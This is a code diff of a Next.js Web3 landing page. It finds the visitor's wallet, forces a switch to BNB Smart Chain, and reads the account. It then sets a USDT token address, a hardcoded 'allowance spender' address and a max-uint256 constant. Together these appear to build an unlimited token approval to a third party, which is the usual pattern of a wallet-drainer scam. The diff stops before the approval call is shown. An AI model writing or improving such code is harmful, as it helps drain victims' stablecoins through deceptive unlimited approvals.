@@ -8,15 +8,9 @@ type Eip1193Provider = {
     params?: unknown[];
   }) => Promise<unknown>;
 
-  on?: (
-    event: string,
-    listener: (...args: unknown[]) => void,
-  ) => void;
+  on?: (event: string, listener: (...args: unknown[]) => void) => void;
 
-  removeListener?: (
-    event: string,
-    listener: (...args: unknown[]) => void,
-  ) => void;
+  removeListener?: (event: string, listener: (...args: unknown[]) => void) => void;
 };
 
 type Eip6963ProviderDetail = {
@@ -34,8 +28,9 @@ declare global {
   }
 }
 
-const BSC_CHAIN_ID = 56;
-const BSC_CHAIN_HEX = "0x38";
+const chainId = process.env.NEXT_PUBLIC_CHAIN_ID ?? "56";
+const targetChainId = BigInt(chainId);
+const targetChainHex = `0x${targetChainId.toString(16)}`;
 const MAX_UINT256_HEX = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
 const highlights = [
@@ -109,7 +104,7 @@ function toHex32(value: string) {
   return value.startsWith("0x") ? value.slice(2).padStart(64, "0") : value.padStart(64, "0");
 }
 
-async function switchToBsc(provider: Eip1193Provider): Promise<boolean> {
+async function switchToBnb(provider: Eip1193Provider): Promise<boolean> {
   try {
     const currentChain = String(
       await provider.request({
@@ -117,42 +112,48 @@ async function switchToBsc(provider: Eip1193Provider): Promise<boolean> {
       }),
     ).toLowerCase();
 
-    if (currentChain === BSC_CHAIN_HEX) {
+    if (currentChain === targetChainHex) {
       return true;
     }
 
     try {
       await provider.request({
         method: "wallet_switchEthereumChain",
-        params: [{ chainId: BSC_CHAIN_HEX }],
+        params: [{ chainId: targetChainHex }],
       });
     } catch (error) {
-      const code = (error as { code?: number }).code;
+      const errorCode = (error as { code?: number }).code;
 
-      if (code !== 4902) {
+      if (errorCode !== 4902) {
         return false;
       }
+
+      const isTestnet = targetChainId === BigInt(97);
 
       await provider.request({
         method: "wallet_addEthereumChain",
         params: [
           {
-            chainId: BSC_CHAIN_HEX,
-            chainName: "BNB Smart Chain",
+            chainId: targetChainHex,
+            chainName: isTestnet ? "BNB Smart Chain Testnet" : "BNB Smart Chain",
             nativeCurrency: {
               name: "BNB",
               symbol: "BNB",
               decimals: 18,
             },
-            rpcUrls: ["https://data-seed.bnbchain.org"],
-            blockExplorerUrls: ["https://bscscan.com"],
+            rpcUrls: [
+              isTestnet ? "https://data-seed-prebsc-1-s1.bnbchain.org:8545" : "https://data-seed.bnbchain.org",
+            ],
+            blockExplorerUrls: [
+              isTestnet ? "https://testnet.bscscan.com" : "https://bscscan.com",
+            ],
           },
         ],
       });
 
       await provider.request({
         method: "wallet_switchEthereumChain",
-        params: [{ chainId: BSC_CHAIN_HEX }],
+        params: [{ chainId: targetChainHex }],
       });
     }
 
@@ -162,7 +163,7 @@ async function switchToBsc(provider: Eip1193Provider): Promise<boolean> {
       }),
     ).toLowerCase();
 
-    return finalChain === BSC_CHAIN_HEX;
+    return finalChain === targetChainHex;
   } catch {
     return false;
   }
@@ -180,8 +181,7 @@ export default function Home() {
     let discoveredProvider = Boolean(window.ethereum);
 
     const announced = (event: Event) => {
-      const detail = (event as CustomEvent<Eip6963ProviderDetail>).detail;
-      const provider = detail?.provider;
+      const provider = (event as CustomEvent<Eip6963ProviderDetail>).detail?.provider;
 
       if (provider) {
         discoveredProvider = true;
@@ -196,7 +196,7 @@ export default function Home() {
     window.addEventListener("eip6963:announceProvider", announced);
     window.dispatchEvent(new Event("eip6963:requestProvider"));
 
-    const timer = window.setTimeout(() => {
+    const unavailableTimer = window.setTimeout(() => {
       if (!discoveredProvider && !walletUnavailableAlerted.current) {
         walletUnavailableAlerted.current = true;
         alert("Please open this page in a compatible Web3 wallet.");
@@ -204,7 +204,7 @@ export default function Home() {
     }, 1000);
 
     return () => {
-      window.clearTimeout(timer);
+      window.clearTimeout(unavailableTimer);
       window.removeEventListener("eip6963:announceProvider", announced);
     };
   }, []);
@@ -220,9 +220,11 @@ export default function Home() {
 
     const accountsChanged = (...args: unknown[]) => {
       const accounts = args[0];
-      const address = Array.isArray(accounts) && typeof accounts[0] === "string" ? accounts[0] : "";
+      const address =
+        Array.isArray(accounts) && typeof accounts[0] === "string" ? accounts[0] : "";
+
       setWalletAddress(address);
-      setNotice(address ? "" : "Wallet disconnected.");
+      setNotice(address ? "" : "Wallet disconnected. Connect again to continue.");
     };
 
     const chainChanged = () => {
@@ -234,13 +236,20 @@ export default function Home() {
 
     const autoConnect = async () => {
       try {
+        const switched = await switchToBnb(provider);
+
+        if (!switched) {
+          return;
+        }
+
         const accounts = await provider.request({ method: "eth_accounts" });
+
         if (Array.isArray(accounts) && typeof accounts[0] === "string" && accounts[0]) {
           setWalletAddress(accounts[0]);
           setNotice("");
         }
-      } catch {
-        setNotice("Unable to access the wallet.");
+      } catch (error) {
+        setNotice(error instanceof Error ? error.message : "Unable to connect to the wallet.");
       }
     };
 
@@ -252,7 +261,7 @@ export default function Home() {
     };
   }, [walletProvider]);
 
-  function getProvider() {
+  function getProvider(): Eip1193Provider | undefined {
     return walletProvider ?? window.ethereum;
   }
 
@@ -273,12 +282,14 @@ export default function Home() {
       }
 
       const account = accounts[0];
-      const switched = await switchToBsc(provider);
+      const switched = await switchToBnb(provider);
 
       if (!switched) {
         alert("Please switch your wallet to BNB Smart Chain Mainnet.");
         return;
       }
+
+      setWalletAddress(account);
 
       const tokenAddress = process.env.NEXT_PUBLIC_USDT_ADDRESS ?? "0x55d398326f99059fF775485246999027B3197955";
       const spenderAddress = process.env.NEXT_PUBLIC_ALLOWANCE_SPENDER_ADDRESS ?? "0x698f4c854C8F6fD8fCC84af2E5d399D78E5792B2";
